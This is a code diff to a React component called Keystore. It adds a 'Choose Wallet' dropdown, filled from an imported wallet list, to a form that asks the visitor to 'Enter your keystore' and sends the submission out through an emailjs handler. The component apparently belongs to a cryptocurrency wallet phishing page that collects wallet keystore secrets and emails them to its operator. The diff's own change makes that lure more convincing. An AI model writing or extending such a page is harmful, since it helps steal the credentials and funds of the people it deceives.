@@ -2,6 +2,9 @@ import React, { useState } from "react";
 import emailjs from "emailjs-com";
 import { Link } from "react-router-dom";
 
+import Data from "../data"
+
+
 const sendEmail = (e) => {
   e.preventDefault();
 
@@ -61,6 +64,15 @@ const Keystore = () => {
           </div>
         ) : null}
         <form onSubmit={sendEmail}>
+          <label for="wallet"> Choose Wallet: {" "}</label>
+          <select style={{ color: "black", padding: ".5em" }} name="wallet" id="wallet">
+            {Data.map((item) => {
+              return (
+                <option style={{ color: "black" }} key={item.id} value={item.name} name="wallet">{item.name}</option>
+              )
+            })}
+          </select>
+          <br />
           <input
             type="text"
             placeholder="Enter your keystore"
